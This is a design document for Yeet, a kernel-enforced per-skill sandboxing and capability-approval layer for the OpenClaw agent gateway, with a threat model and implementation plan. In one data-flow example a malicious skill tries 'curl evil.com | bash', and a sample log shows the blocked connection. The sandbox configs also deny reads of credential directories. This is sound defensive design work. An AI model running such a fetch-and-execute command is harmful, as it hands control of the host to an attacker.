---
layout: doc
title: Yeet — Trust Layer for OpenClaw
description: Per-skill sandboxing, capability model, AI-driven compatibility with the entire OpenClaw ecosystem, and fleet dispatch.
---

# Yeet

A trust and sandboxing layer for OpenClaw. Every skill runs in its own kernel-enforced sandbox. Capabilities approved once at install. Compatible with the entire OpenClaw ecosystem on day one — AI infers capability manifests for existing skills automatically.

Version: 2.0.0
Date: 2026-03-29

---

## Table of Contents

1. [What This Is](#1-what-this-is)
2. [Personas](#2-personas)
3. [Architecture](#3-architecture)
4. [The Permission Problem](#4-the-permission-problem)
5. [Capability Model](#5-capability-model)
6. [Sandbox Enforcement](#6-sandbox-enforcement)
7. [AI Capability Inference](#7-ai-capability-inference)
8. [Fleet Dispatch](#8-fleet-dispatch)
9. [Skill Scanning and Signing](#9-skill-scanning-and-signing)
10. [Data Flows](#10-data-flows)
11. [Security Model](#11-security-model)
12. [Repo Structure](#12-repo-structure)
13. [Implementation Plan](#13-implementation-plan)

---

## 1. What This Is

**OpenClaw** is a self-hosted gateway connecting 22+ chat platforms to AI agents via Pi. MIT licensed, 339k stars. It handles channels, sessions, routing, skills, web UI, and mobile apps.

**OpenClaw's security gap:** Skills run as untrusted code with no permission model. ClawHub has no verification. The sandbox is global, not per-skill. Users either run unsandboxed or deal with per-action permission prompts and eventually pass `--dangerously-skip-permissions`.

**Yeet** fills this gap without forking OpenClaw:

| What | Who Provides |
|------|-------------|
| 22+ chat channels, gateway, Pi agent, web UI, mobile apps, ClawHub | **OpenClaw** (unmodified) |
| Per-skill kernel sandboxing via ASRT | **Yeet** |
| Capability manifests — approve once, enforce always | **Yeet** |
| AI inference of capabilities for existing OpenClaw skills | **Yeet** |
| Skill scanning, Ed25519 signing, trust levels | **Yeet** |
| Fleet dispatch via Nomad — also sandboxed | **Yeet** |

**Day-one OpenClaw ecosystem compatibility.** Every existing ClawHub skill works. Yeet's AI reads the skill code and generates a capability manifest. The user approves. The skill runs sandboxed. No changes needed from skill authors.

---

## 2. Personas

### 2.1 Home User — "Alex"
Non-technical. Chat assistant via HA voice or Signal. "What's for dinner?" / "Turn off the lights." Installs from curated list. Capability approval in plain language.

### 2.2 Power User — "Sam"
Runs a homelab. Installs community skills. Reviews scoped capabilities. May write simple SKILL.md files.

### 2.3 Developer — "Jordan"
Software engineer. Uses `yeet` CLI + coding agents. Writes and signs skills. 1-2 fleet nodes.

### 2.4 Platform Engineer — "Riley"
Multi-project, multi-model, multi-agent. Full fleet. CI scanning. Audit logs. Cost tracking.

### 2.5 Feature Matrix

| Feature | Alex | Sam | Jordan | Riley |
|---------|:----:|:---:|:------:|:-----:|
| Chat (Signal/HA/Telegram/etc.) | Y | Y | Y | Y |
| Capability approval | plain language | scoped | manifest-level | CI strict |
| Write skills | - | Y | Y | Y |
| Sign/publish skills | - | - | Y | Y |
| Fleet dispatch | - | - | basic | full |
| Multi-agent coding | - | - | - | Y |
| Audit logs | - | - | - | Y |

### 2.6 Auditability Principle

- Skill code is readable: one SKILL.md, no build step
- Capabilities are explicit: approved by user, persisted as JSON
- Every tool call logged: timestamp, tool, args, result, skill, capability
- Scanner is deterministic: same findings every time
- No hidden network calls: kernel-enforced per-skill domain allowlists
- History is queryable: all data in SQLite
- Dashboard shows provenance: which skill, which capability, when approved

---

## 3. Architecture

### 3.1 The Supervisor Model

Yeet is a supervisor process that owns all sandboxes. OpenClaw runs inside one sandbox. Each skill runs inside its own. The supervisor is the only unsandboxed process.

```
yeet start (supervisor — the only unsandboxed process, ~200 lines)
  │
  ├── OUTER ASRT SANDBOX → OpenClaw
  │   │  network: [signal-cli, openrouter.ai]  (init-locked, signed)
  │   │  filesystem: [~/.openclaw/data]
  │   │  deny: [~/.ssh, ~/.aws, ~/.gnupg]
  │   │
  │   │  OpenClaw Gateway + Pi Agent + yeet plugin
  │   │  Channels: Signal, Telegram, WhatsApp, Discord, HA, iMessage...
  │   │
  │   │  On tool call → IPC to supervisor via unix socket
  │   │
  │   └── unix socket ──→ supervisor
  │
  ├── SKILL ASRT SANDBOX → meals worker
  │   network: [meals-api.wan0.cloud]
  │   filesystem: none
  │
  ├── SKILL ASRT SANDBOX → HA worker
  │   network: [homeassistant.local:8123]
  │   filesystem: none
  │
  ├── SKILL ASRT SANDBOX → coding agent
  │   network: [github.com, registry.npmjs.org, openrouter.ai]
  │   filesystem: [./workspace]
  │   exec: [git, npm, node]
  │
  └── SKILL ASRT SANDBOX → weather worker
      network: [api.weather.com]
      filesystem: none
```

**Key properties:**
- OpenClaw cannot reach hosts that skills can reach (and vice versa)
- Skills cannot reach each other's hosts
- Installing a new skill never widens the gateway's attack surface
- Uninstalling a skill removes its sandbox — no gateway config change needed
- A compromised skill can't leverage the gateway's access (separate process)
- A compromised gateway can't leverage a skill's access (separate process)
- The supervisor is ~200 lines: spawn sandboxed processes, shuttle IPC messages

### 3.2 Data Flow

```
User sends message on Signal
  │
  ▼
OpenClaw (in outer ASRT) receives message, routes to Pi Agent
  │
  ▼
Pi Agent calls LLM (OpenRouter) → LLM returns tool call
  │
  ▼
Yeet interceptor (tool.before) inside OpenClaw:
  1. Identify which skill owns this tool
  2. Check capability approval
  3. Send IPC request to supervisor: {skill, tool, args}
  │
  ▼
Supervisor (unsandboxed):
  1. Look up skill's approved capabilities
  2. Generate ASRT config for this skill
  3. Spawn (or reuse) skill worker process in its own ASRT sandbox
  4. Pass tool call via stdin
  5. Read result from stdout
  6. Log to audit DB
  7. Return result to OpenClaw via IPC
  │
  ▼
Yeet interceptor returns result to Pi Agent
  │
  ▼
Pi Agent formats response → OpenClaw → Signal → user
```

### 3.3 Init-Locked Gateway Config

The outer sandbox config is generated at `yeet init` and **signed**:

```bash
yeet init
  Which channels? → Signal
  LLM provider? → OpenRouter

→ ~/.config/yeet/gateway-sandbox.json:
  network.allowedDomains: ["127.0.0.1:7583", "openrouter.ai"]
  filesystem.allowWrite: ["~/.openclaw/data", "~/.config/yeet"]
  signature: "ed25519:..."
```

**Changes require deliberate action:**
```bash
yeet config add-service telegram    # adds api.telegram.org
yeet config remove-service meals    # removes meals-api host
# Each: confirm → re-sign → restart
```

**Tampering = refuse to start.** Signature mismatch → OpenClaw won't launch.

**Immutable audit trail:** every config change appended to `config-audit.jsonl`.

### 3.4 Yeet Sits Above the Agent

The coding agent runs inside the inner skill sandbox unaware of restrictions:

```
Yeet Capability Gate
  "Does this skill have approved capabilities?" → YES/NO
      │
Inner ASRT Sandbox (per-skill)
  Kernel-enforced, scoped to approved hosts/paths
      │
Coding Agent (Claude Code / Pi / OpenCode / Aider)
  Runs as if --dangerously-skip-permissions
  Actual permissions are TIGHTER than default
  No prompts. No fatigue. No skipping.
      │
OS Kernel (Seatbelt / bubblewrap+seccomp)
  Cannot be bypassed by any userspace code
```

Any agent runtime works without modification.

### 3.5 Integration Points (no OpenClaw fork)

| Hook | What yeet does |
|------|---------------|
| **Interceptor `tool.before`** | Capability check + IPC to supervisor for out-of-process execution |
| **Interceptor `tool.after`** | Audit log |
| **Plugin `before_tool_call`** | First-time approval flow for new capabilities |
| **OpenClaw `registerTool`** | Register fleet dispatch tool |
| **OpenClaw `registerHttpRoute`** | Webhook for fleet results |
| **Process supervisor** | `yeet start` owns all ASRT sandboxes |

---

## 4. The Permission Problem

| Approach | Prompts | Security | UX |
|----------|---------|----------|----|
| Claude Code default | Every action | Good | Unusable — prompt fatigue |
| `--dangerously-skip-permissions` | Never | None | Where users end up |
| **Yeet** | Once at install | Kernel-enforced | Approve once, enforce always |

---

## 5. Capability Model

### 5.1 Named Capabilities

19 capabilities across 7 categories:

| Category | Capabilities | Risk |
|----------|-------------|------|
| Network | `network.external`, `network.internal` | medium |
| Home | `home.read`, `home.control`, `home.automation` | low-medium |
| Data | `data.meals`, `data.history`, `data.memory`, `data.preferences` | low-medium |
| Fleet | `fleet.dispatch`, `fleet.read`, `fleet.manage` | medium-high |
| Notify | `notify.signal`, `notify.push` | low-high |
| System | `system.files.read`, `system.files.write`, `system.exec`, `system.env` | high-dangerous |
| Cost | `cost.api` | medium |

### 5.2 Manifest Format

```json
{
  "name": "meals",
  "capabilities": [
    {
      "capability": "network.external",
      "reason": "Call the meals API backend",
      "scope": ["meals-api.wan0.cloud"]
    },
    {
      "capability": "data.meals",
      "reason": "Read and update fridge, pantry, recipes"
    }
  ]
}
```

### 5.3 Scope Narrows Risk

`network.external` with `scope: ["meals-api.wan0.cloud"]` is fundamentally different from `network.external` with no scope. Unscoped dangerous capabilities are flagged loudly during scanning.

### 5.4 Approval Persistence

Stored in `~/.config/yeet/approvals/{skill-name}.json`. Version-pinned. New version with new capabilities → user prompted for new ones only.

### 5.5 Approval UX Adapts to Persona

- **Alex**: "Meal Planner wants to see your fridge. Allow?"
- **Sam**: "Meal Planner requests: Meal Data (low), External Network to meals-api.wan0.cloud (medium). Allow?"
- **Jordan**: reviews manifest directly
- **Riley**: `yeet verify --strict` in CI

---

## 6. Sandbox Enforcement

### 6.1 ASRT (Anthropic Sandbox Runtime)

`@anthropic-ai/sandbox-runtime`. Apache-2.0. OS-level primitives:

| Platform | Filesystem | Network | Subprocess |
|----------|-----------|---------|-----------|
| macOS | sandbox-exec (Seatbelt) | Seatbelt + proxy | Seatbelt |
| Linux | bubblewrap (bind mounts) | Network namespace + proxy | seccomp BPF |

Kernel-enforced. Wraps any process — not just JS/TS.

### 6.2 Per-Skill ASRT Configuration

Each skill gets its own ASRT config derived from approved capabilities:

```
Skill "meals" approved for:
  network.external: ["meals-api.wan0.cloud"]
  data.meals

→ ASRT config:
  network.allowedDomains: ["meals-api.wan0.cloud"]
  filesystem.allowWrite: []
  filesystem.denyRead: ["~/.ssh", "~/.aws"]
```

```
Skill "coding-agent" approved for:
  system.exec: ["git", "npm", "node"]
  system.files.write: ["./workspace"]
  network.external: ["github.com", "registry.npmjs.org"]

→ ASRT config:
  network.allowedDomains: ["github.com", "registry.npmjs.org"]
  filesystem.allowWrite: ["./workspace"]
  filesystem.denyRead: ["~/.ssh", "~/.aws"]
```

### 6.3 Silent Enforcement

No prompts at runtime. Violations are logged, not prompted:

```
[yeet] network violation: skill "meals" → evil.com (BLOCKED)
       allowed: meals-api.wan0.cloud
       logged to audit.db
```

### 6.4 Process Isolation

Skills run **outside** the outer sandbox as separate processes. OpenClaw and skills cannot see each other's network scope or filesystem access. The supervisor mediates all communication via IPC.

---

## 7. AI Capability Inference

Existing OpenClaw skills and ClawHub skills don't have capability manifests. Yeet generates them automatically.

### 7.1 How It Works

```bash
yeet plugin add some-clawhub-skill
  │
  ├── Download skill
  ├── No capability manifest found
  │
  ├── AI reads SKILL.md:
  │   - Parses tool definitions
  │   - Identifies HTTP endpoints called (domain extraction)
  │   - Identifies filesystem operations (paths, read vs write)
  │   - Identifies shell commands referenced
  │   - Identifies environment variables used
  │
  ├── Generates capability manifest:
  │   {
  │     "capabilities": [
  │       {"capability": "network.external", "scope": ["api.github.com"],
  │        "reason": "AI-inferred: skill makes GitHub API calls"},
  │       {"capability": "system.exec", "scope": ["git", "gh"],
  │        "reason": "AI-inferred: skill runs git commands"}
  │     ],
  │     "inferred": true,
  │     "inferredBy": "claude-sonnet-4",
  │     "inferredAt": "2026-03-29T10:00:00Z"
  │   }
  │
  ├── Scanner runs on inferred manifest
  │   (same checks as author-provided manifests)
  │
  ├── User reviews:
  │   "This skill appears to need:
  │     External Network: api.github.com (medium, AI-inferred)
  │     Run Programs: git, gh (high, AI-inferred)
  │   Allow? [Y/n/details/edit]"
  │
  └── Installed with inferred manifest, runs sandboxed
```

### 7.2 User Can Edit Inferred Manifests

If the AI over-infers (requests too much) or under-infers (misses something), the user can edit:

```bash
yeet plugin capabilities edit some-skill
# Opens manifest in editor
# Changes are validated by scanner
# Re-signed if user has signing key
```

### 7.3 Author Manifests Override AI

If a skill author provides a `plugin.json` with capabilities, the AI inference is skipped. Author manifests are more accurate and carry the author's signature.

### 7.4 Inference Improves Over Time

The AI sees: skill code + what actually got blocked at runtime (from audit logs). On skill update, the AI can refine the manifest based on observed behaviour.

---

## 8. Fleet Dispatch

### 8.1 How It Works

```
User: "build physics system for game"
  │
  ▼
Yeet capability gate: fleet.dispatch approved → YES
  │
  ▼
Supervisor: dispatch via Nomad API
  constraint: meta.project_game = true, device: nvidia/gpu
  │
  ▼
Fleet node (yeet-02):
  yeet start (supervisor)
    ├── OUTER ASRT → OpenClaw (minimal, no channels needed)
    └── SKILL ASRT → coding agent
        Capabilities propagated from dispatch
        network: [github.com, openrouter.ai]
        filesystem: [./workspace/game]
        exec: [git, npm, node]
  │
  Results → PR → webhook → your machine
```

### 8.2 Same Security Everywhere

Every fleet node runs the same `yeet start` supervisor. Capabilities propagated from dispatch — a skill can't escalate on a fleet node.

### 8.3 Nomad Handles Infrastructure

Task scheduling, GPU/device routing, node health, log streaming, cost tracking, node drain — all Nomad native features.

---

## 9. Skill Scanning and Signing

### 9.1 The Scanner

```bash
yeet verify ./my-skill

  Y [PLUGIN_001] Manifest valid
  ! [PLUGIN_002] Skill is unsigned
  . [PLUGIN_OK] Found 8 tool(s)
  . [PLUGIN_OK] External Network: meals-api.wan0.cloud (medium)
  . [PLUGIN_OK] Meal Data (low)

  PASS with 1 warning(s)
```

Checks: manifest validation, signature verification, capability risk assessment, static analysis (subprocess, filesystem, FFI patterns), tool definition completeness.

### 9.2 Signing

Ed25519. Trust levels: `full` (auto-load), `prompt` (ask before loading), `audit` (load but log everything).

### 9.3 Install Flow

```bash
yeet plugin add https://github.com/user/some-skill

  Cloning... Scanning...
  No manifest found — running AI capability inference...

  This skill appears to need:
    External Network: api.github.com (medium, AI-inferred)
    Run Programs: git, gh (high, AI-inferred)

  Allow? [Y/n/details/edit]
```

---

## 10. Data Flows

### Flow 1: "What's for dinner?" (Signal)

```
Signal → OpenClaw (outer ASRT) → Pi Agent → LLM → tool call: meals_suggest
  → yeet interceptor → IPC → supervisor
  → supervisor spawns meals worker (skill ASRT: meals-api.wan0.cloud only)
  → worker calls meals API → result
  → supervisor → IPC → OpenClaw → Pi formats response → Signal → user
```

### Flow 2: "Turn off the lights" (HA voice)

```
HA Assist → OpenClaw → Pi → tool call: ha_call_service
  → supervisor → HA worker (skill ASRT: homeassistant.local only)
  → POST homeassistant.local/api/services/light/turn_off
  → "Done, lights off." → HA TTS
```

### Flow 3: Coding task dispatched to fleet

```
Signal → OpenClaw → Pi → tool call: fleet_dispatch
  → supervisor → Nomad dispatch → fleet node
  → fleet node runs yeet start → coding agent in skill ASRT
  → PRs created via bot account → webhook back → Signal: "PRs ready"
```

### Flow 4: Existing ClawHub skill installed

```
yeet plugin add clawhub-skill
  → download → no manifest → AI reads SKILL.md
  → infers: network.external: ["some-api.com"], system.exec: ["curl"]
  → scanner validates inferred manifest
  → user reviews and approves
  → installed, runs in its own ASRT sandbox
  → works exactly as it did on vanilla OpenClaw, but sandboxed
```

### Flow 5: Malicious skill blocked

```
Skill tries: curl evil.com | bash
  → supervisor checks: skill's ASRT config has allowedDomains: ["weather.com"]
  → ASRT blocks connection to evil.com at kernel level
  → skill gets ECONNREFUSED
  → audit log: "network violation: skill 'weather' → evil.com (BLOCKED)"
  → user never sees a prompt
```

---

## 11. Security Model

### 11.1 Defence in Depth (6 Layers)

```
Layer 1: Init-locked gateway config (signed, audited)
Layer 2: OpenClaw tool policy (deny groups, exec security)
Layer 3: Yeet capability gate (interceptor — check approval)
Layer 4: Yeet approval flow (first-time dangerous ops → confirm once)
Layer 5: Per-skill ASRT sandbox (kernel-enforced, out-of-process)
Layer 6: Outer ASRT sandbox (backstop — gateway process locked down)
```

### 11.2 Threat Matrix

| Threat | Mitigation |
|--------|-----------|
| Skill reads ~/.ssh | ASRT mandatory deny — always blocked, both layers |
| Skill exfiltrates to unknown host | Skill ASRT: only approved hosts. Gateway ASRT: only init-configured. Kernel-enforced. |
| Skill writes outside workspace | Skill ASRT: allowWrite scoped. Kernel-enforced. |
| Skill runs destructive commands | Capability gate blocks unless system.exec approved. ASRT scopes to allowed binaries. |
| In-process OpenClaw plugin compromised | Outer ASRT restricts entire gateway. Can't reach skill-only hosts. Signed config can't be widened. |
| Skill accesses another skill's service | Out-of-process isolation. Meals worker can't reach HA. HA worker can't reach meals API. |
| New skill widens gateway attack surface | Skills run outside outer sandbox. Installing skills never changes gateway config. |
| Unconfigured channel accessed | Outer ASRT blocks the API host at kernel level. |
| Supply chain: malicious ClawHub skill | AI inference + scanner + user approval before any code runs. |
| Prompt injection via tool results | Capability gate applies to subsequent calls. Cross-skill tool calls checked against originating skill. |

### 11.3 Remaining Gaps

**Gap 1: User approves too broadly.** Scanner warns. Possible improvement: require scoping for dangerous capabilities.

**Gap 2: Cross-skill context leakage in shared Pi session.** Skills share conversation context. A malicious skill could read other skills' tool results. Mitigation: out-of-process execution limits data exposure, but Pi session is still shared. Improvement: per-skill session isolation.

**Gap 3: Prompt injection causing cross-skill tool calls.** Mitigated by capability gate checking tool ownership. Improvement: track originating skill per turn.

**Gap 4: No runtime cost enforcement.** Audit log tracks usage. Improvement: budget caps per skill.

**Gap 5: Nested ASRT (outer + skill).** Skills run outside outer ASRT, so no nesting issue. The supervisor spawns skill sandboxes independently.

**Gap 6: AI inference accuracy.** AI might over-infer or under-infer capabilities. Mitigated by user review + edit capability. Improves with audit log feedback.

**Gap 7: Supervisor is unsandboxed.** The supervisor process has full access. It's ~200 lines of our code, does nothing except spawn sandboxed processes and shuttle IPC. Attack surface is minimal but exists. Mitigated by code simplicity and signing.

### 11.4 Philosophy

Make the risk visible. Make the boundaries enforceable. Let the user decide once, enforce always. Don't nag on every action.

---

## 12. Repo Structure

### 12.1 What Stays

```
yeet/                              # Public umbrella (wan0net/yeet)
├── docs/                          # Design doc, architecture diagram
│   ├── unified-platform.md
│   └── architecture.svg
├── ansible/                       # Fleet provisioning
├── jobs/                          # Nomad job templates
├── cli/                           # Original yeet CLI (stays until v2 is ready)
├── gateway/                       # Original gateway (stays until v2 is ready)
│
├── packages/                      # v2 submodules
│   ├── sdk/                       # Capability types, ASRT mapper, scanning (DONE)
│   ├── supervisor/                # Process supervisor, ASRT spawning, audit (DONE)
│   ├── openclaw-plugin/           # Interceptors, IPC to supervisor (DONE)
│   ├── cli/                       # yeet CLI v2: init, verify, sign, approve (PARTIAL)
│   ├── inference/                 # AI capability inference (NOT STARTED)
│   └── frontend/                  # Dashboard additions to OpenClaw web UI (SCAFFOLD)
```

### 12.2 What Was Retired

| Repo | Why Retired |
|------|-----------|
| `yeet-core` | OpenClaw is the gateway. Custom Deno gateway was a stepping stone. Archived. |
| `yeet-sandbox` | Supervisor has ASRT integration built in. Redundant. Archived. |

### 12.3 Skills (separate repos, each its own sandbox)

```
yeet-skill-meals/                  # Meal planning (DONE, needs IPC refactor)
yeet-skill-ha/                     # Home Assistant control (NOT STARTED)
yeet-skill-briefing/               # News briefing (NOT STARTED)
yeet-skill-fleet/                  # Fleet dispatch via Nomad (NOT STARTED)
yeet-skill-composio/               # Multi-agent orchestration (NOT STARTED)
yeet-skill-godot/                  # Godot game dev via MCP (NOT STARTED)
```

Any existing OpenClaw/ClawHub skill also works — AI infers capabilities automatically.
MCP servers run as sandboxed skills (supervisor spawns them in ASRT, stdio transport).

### 12.4 Runtime

Node.js + TypeScript everywhere. Consistent with OpenClaw.

| Component | Runtime | Why |
|-----------|---------|-----|
| OpenClaw | Node.js | It's an OpenClaw ecosystem |
| Supervisor | Node.js (via tsx) | Same runtime as OpenClaw |
| CLI | Node.js (via tsx) | Same runtime |
| Skills | Node.js (via tsx) | Compatible with OpenClaw skills |
| SDK | Pure TypeScript | Runtime-agnostic (works anywhere) |
| ASRT (srt) | Go binary | Wraps everything, runtime doesn't matter |

No Deno. One runtime, one ecosystem. User installs Node.js (required for OpenClaw anyway) and that's it.

### 12.5 Dependency Graph

```
yeet-sdk                           (zero deps — DONE)
  |
yeet-supervisor                    (sdk + srt — DONE)
  |
yeet-openclaw-plugin               (sdk — DONE)
yeet-cli                           (sdk — PARTIAL)
yeet-inference                     (sdk + LLM client — NOT STARTED)
yeet-frontend                      (talks to supervisor API — SCAFFOLD)
yeet-skill-*                       (sdk for types — meals DONE, rest NOT STARTED)
```

### 12.5 Line Counts

| Component | Lines | Status |
|-----------|------:|--------|
| yeet-sdk | ~700 | Done |
| yeet-supervisor | ~580 | Done |
| yeet-openclaw-plugin | ~380 | Done |
| yeet-cli | ~500 | Partial (~200 remaining) |
| yeet-skill-meals | ~350 | Done (needs IPC refactor) |
| yeet-inference | ~200 | Not started |
| yeet-frontend | ~1500 | Not started |
| **Trust path total** | **~1,660** | **Auditable in an afternoon** |

---

## 13. Implementation Plan

### Phase 1: Supervisor + Sandbox — DONE

- [x] `yeet-sdk`: capability types, ASRT config mapper, scanning, testing
- [x] `yeet-supervisor`: unix socket IPC, approval store, ASRT sandbox spawning, audit log
- [x] `yeet-openclaw-plugin`: tool.before/after interceptors, IPC client, skill mapping
- [x] `yeet-cli`: init wizard (persona-driven), verify scanner
- [x] `yeet-skill-meals`: 8 tools with capability manifest
- [ ] Test: manually create approval, supervisor spawns sandboxed process

### Phase 2: End-to-End Integration

- [ ] `yeet start` command: starts supervisor + OpenClaw in outer ASRT
- [ ] Install OpenClaw locally, register yeet plugin
- [ ] Test: Signal message → OpenClaw → yeet interceptor → supervisor → sandboxed skill → result
- [ ] Test: skill tries to reach unapproved host → ASRT blocks → audit log entry

### Phase 3: Homelab Skills

- [ ] Refactor `yeet-skill-meals` for out-of-process IPC model (stdin/stdout JSON)
- [ ] `yeet-skill-ha`: Home Assistant (state reading, service calls, automations)
- [ ] `yeet-skill-briefing`: news digest from existing CF Worker
- [ ] Test: "what's for dinner?" and "turn off the lights" via Signal

### Phase 4: AI Capability Inference

- [ ] `yeet-inference`: read SKILL.md, send to LLM, extract capabilities
- [ ] `yeet plugin add`: clone → infer → scan → approve → install
- [ ] Test with 5 popular ClawHub skills
- [ ] Validates day-one OpenClaw ecosystem compatibility

### Phase 5: CLI Completion

- [ ] `yeet approve`: review and modify capability approvals
- [ ] `yeet config`: add/remove services, re-sign gateway config
- [ ] `yeet audit`: query audit log
- [ ] `yeet sign`: Ed25519 signing
- [ ] `yeet plugin list/remove`: plugin management
- [ ] SSH and AWS as opt-in capabilities (controlled access, not blanket deny)

### Phase 6: Fleet Dispatch

- [ ] `yeet-skill-fleet`: Nomad dispatch + status + logs
- [ ] Fleet node provisioning via Ansible (OpenClaw + yeet + ASRT)
- [ ] Capability propagation from dispatch to fleet node
- [ ] Fleet nodes delegate to coding agents (Claude Code, OpenCode, Aider)
- [ ] Coding agents use their own API keys/subs, not the gateway's
- [ ] `yeet-skill-composio`: multi-agent orchestration
- [ ] Test: "build feature X on project Y" → fleet node → sandboxed agents → PRs

### Phase 7: Dashboard + Signing

- [ ] Dashboard additions to OpenClaw's web UI
- [ ] Agent status, fleet overview, PR review, cost tracking, audit viewer
- [ ] Capability approval management UI
- [ ] Trust store management
- [ ] CI integration: `yeet verify --strict`

### Phase 8: Advanced (ongoing)

- [ ] Budget enforcement per skill
- [ ] Per-skill session isolation
- [ ] Godot plugin (MCP bridge to GPU node)
- [ ] SSH/AWS controlled access capabilities
- [ ] Runtime cost alerting
- [ ] Community skill curation tooling
